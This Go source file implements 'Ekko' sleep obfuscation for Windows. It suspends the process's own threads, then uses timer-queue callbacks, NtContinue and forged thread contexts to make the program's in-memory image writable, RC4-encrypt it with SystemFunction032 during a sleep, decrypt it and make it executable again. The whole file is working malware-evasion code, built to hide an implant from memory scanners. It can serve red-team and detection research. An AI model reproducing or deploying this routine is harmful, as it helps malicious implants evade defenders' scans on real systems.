package ekko

import (
	"crypto/rand"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	WT_EXECUTEINTIMERTHREAD         = 0x00000020
	ThreadQuerySetWin32StartAddress = 0x9

	// Just what we need: suspend/resume + query for the start-address check.
	threadAccess = windows.THREAD_SUSPEND_RESUME | windows.THREAD_QUERY_INFORMATION | windows.THREAD_GET_CONTEXT

	// CONTEXT_CONTROL on amd64. GetThreadContext after SuspendThread forces
	// the kernel to actually commit the suspension before we touch memory.
	contextControlAMD64 = 0x00100001
)

var (
	// kernel32
	kernel32dll               = syscall.NewLazyDLL("kernel32.dll")
	procSuspendThread         = kernel32dll.NewProc("SuspendThread")
	procResumeThread          = kernel32dll.NewProc("ResumeThread")
	procGetThreadContext      = kernel32dll.NewProc("GetThreadContext")
	procGetModuleHandleA      = kernel32dll.NewProc("GetModuleHandleA")
	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
	procCreateTimerQueueTimer = kernel32dll.NewProc("CreateTimerQueueTimer")
	procRtlCaptureContext     = kernel32dll.NewProc("RtlCaptureContext")
	procVirtualProtect        = kernel32dll.NewProc("VirtualProtect")
	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
	procSetEvent              = kernel32dll.NewProc("SetEvent")
	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")

	//ntdll
	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtContinue               = ntdll.NewProc("NtContinue")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	//Advapi32
	Advapi32dll           = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
)

func EkkoSleep(sleepTime uint64) error {

	currentProcessID := uint32(windows.GetCurrentProcessId())

	// Take a snapshot of all running threads in the system
	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hThreadSnapshot)

	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	// Retrieve information about the first thread in the snapshot
	err = windows.Thread32First(hThreadSnapshot, &te32)
	if err != nil {
		return err
	}

	// Track threads we actually suspended so the resume pass touches exactly
	// the same set (in case threads exit between suspend and resume, which
	// would otherwise cause OpenThread to fail mid-resume).
	suspendedTIDs := make([]uint32, 0, 64)

	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
	ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)

	for {
		if te32.OwnerProcessID == currentProcessID && windows.GetCurrentThreadId() != te32.ThreadID {
			hThread, openErr := windows.OpenThread(threadAccess, false, te32.ThreadID)
			if openErr == nil {
				var dwStartAddress, size uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					ThreadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&dwStartAddress)),
					unsafe.Sizeof(dwStartAddress),
					uintptr(unsafe.Pointer(&size)),
				)

				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
					if r, _, _ := procSuspendThread.Call(uintptr(hThread)); r != ^uintptr(0) {
						// SuspendThread is asynchronous; GetThreadContext forces the
						// suspend to commit before we proceed to mutate memory.
						var ctx CONTEXT
						ctx.ContextFlags = contextControlAMD64
						procGetThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(&ctx)))
						suspendedTIDs = append(suspendedTIDs, te32.ThreadID)
					}
				}
				windows.CloseHandle(hThread)
			}
		}

		// ALWAYS advance — never `continue` without advancing, or we infinite-loop.
		if err = windows.Thread32Next(hThreadSnapshot, &te32); err != nil {
			break // No more threads
		}
	}


	ekkoErr := ekko(sleepTime)

	// Resume exactly the threads we suspended. Iterate the captured TID list
	// rather than re-walking the snapshot, so a single OpenThread failure
	// (e.g. a thread exited during the sleep) cannot prevent the remaining
	// suspended threads from being resumed.
	for _, tid := range suspendedTIDs {
		hThread, openErr := windows.OpenThread(threadAccess, false, tid)
		if openErr != nil {
			// Thread is gone; nothing left to resume for this TID. Keep going.
			continue
		}
		procResumeThread.Call(uintptr(hThread))
		windows.CloseHandle(hThread)
	}

	return ekkoErr
}

func ekko(sleepTime uint64) error {

	var CtxThread CONTEXT
	var RopProtRW CONTEXT
	var RopMemEnc CONTEXT
	var RopDelay CONTEXT
	var RopMemDec CONTEXT
	var RopProtRX CONTEXT
	var RopSetEvt CONTEXT

	var keybuf [16]byte
        rand.Read(keybuf[:])

	var Key, Img UString

	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))

	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
	var hNewTimer, hTimerQueue uintptr
	hTimerQueue, _, _ = procCreateTimerQueue.Call()

	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
	Img.Length = nt_header.OptionalHeader.SizeOfImage

	Key.Buffer = &keybuf[0]
	Key.Length = uint32(unsafe.Sizeof(Key))

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)

	if CtxThread.Rip == 0 {
		log.Fatalln()
	}
	RopProtRW = CtxThread
	RopMemEnc = CtxThread
	RopDelay = CtxThread
	RopMemDec = CtxThread
	RopProtRX = CtxThread
	RopSetEvt = CtxThread

	var OldProtect uint64
	RopProtRW.Rsp -= 8
	RopProtRW.Rip = uint64(procVirtualProtect.Addr())
	RopProtRW.Rcx = uint64(ImageBase)
	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRW.R8 = windows.PAGE_READWRITE
	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))

	RopMemEnc.Rsp -= 8
	RopMemEnc.Rip = uint64(procSystemFunction032.Addr())
	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))

	RopDelay.Rsp -= 8
	RopDelay.Rip = uint64(procWaitForSingleObject.Addr())
	RopDelay.Rcx = uint64(windows.CurrentProcess())
	RopDelay.Rdx = sleepTime

	RopMemDec.Rsp -= 8
	RopMemDec.Rip = uint64(procSystemFunction032.Addr())
	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))

	RopProtRX.Rsp -= 8
	RopProtRX.Rip = uint64(procVirtualProtect.Addr())
	RopProtRX.Rcx = uint64(ImageBase)
	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRX.R8 = windows.PAGE_EXECUTE_READWRITE
	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))

	// SetEvent( hEvent );
	RopSetEvt.Rsp -= 8
	RopSetEvt.Rip = uint64(procSetEvent.Addr())
	RopSetEvt.Rcx = uint64(hEvent)

	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRW)), 100, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemEnc)), 200, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopDelay)), 300, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemDec)), 400, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)

	windows.WaitForSingleObject(windows.Handle(hEvent), windows.INFINITE)
	procDeleteTimerQueue.Call(hTimerQueue)

	return nil
}
